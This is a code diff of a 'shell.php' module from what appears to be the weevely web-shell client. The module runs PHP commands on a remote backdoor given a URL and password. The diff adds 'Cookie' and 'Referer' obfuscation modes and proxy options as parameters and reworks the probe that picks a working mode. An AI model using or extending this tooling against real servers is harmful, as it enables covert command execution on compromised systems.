@@ -14,15 +14,15 @@ classname = 'Php'
     
     
 class Php(Module):
-    '''Shell to execute PHP commands
-    :shell.php "<command>;"
-    '''
+    '''Shell to execute PHP commands'''
     
     params = ParametersList('PHP command shell', [],
-                             P(arg='cmd', help='PHP commands (end with semi-comma)', required=True, pos=0),
+                             P(arg='cmd', help='PHP commands. Terminate with semi-comma', required=True, pos=0),
+                             P(arg='mode', help='Obfuscation mode', choices = ['Cookie', 'Referer' ]),
+                             P(arg='proxy', help='HTTP proxy')
                         )
     
-    available_modes = [ 'Cookie', 'Referer' ]
+#    available_modes = [ 'Cookie', 'Referer' ]
     
     def __init__(self, modhandler, url, password):
         
@@ -32,8 +32,10 @@ class Php(Module):
         
         self.current_mode = None
                     
-        mode = modhandler.conf.get_option('global', 'request_mode')
-        if mode in self.available_modes:
+        self.available_modes = self.params.get_parameter_choices('mode')
+                    
+        mode = self.params.get_parameter_value('mode')
+        if mode:
             self.modes = [ mode ]
         else:
             self.modes = self.available_modes
@@ -41,10 +43,10 @@ class Php(Module):
         
         Module.__init__(self, modhandler, url, password)
         
-        proxy = modhandler.conf.get_option('global', 'http_proxy')
+        proxy = self.params.get_parameter_value('proxy')
         if proxy:
-            self.mprint('[shell.php] Proxies cache can break requests. Use proxychains.')
-            #self.proxy = { 'http' : proxy }
+            self.mprint('[shell.php] Proxy that uses cache can break weevely requests. Use proxychains.')
+            self.proxy = { 'http' : proxy }
 
         self.mprint('[shell.php] Loaded using \'%s\' encapsulation' % self.current_mode)
         
@@ -52,19 +54,19 @@ class Php(Module):
 
     def _probe(self):
         
-        found = False
         for currentmode in self.modes:
             
             rand = str(random.randint( 11111, 99999 ))
-            self.current_mode = currentmode
             
             if self.run_module('echo %s;' % (rand)) == rand:
-                found = True
+                self.current_mode = currentmode
+                self.params.set_and_check_parameters({'mode' : currentmode}, False)
                 break
         
-        if not found:
+        if not self.current_mode:
             raise ModuleException(self.name,  "PHP interpreter initialization failed")
         else:
+            
             if self.run_module('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
                 self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
             else:
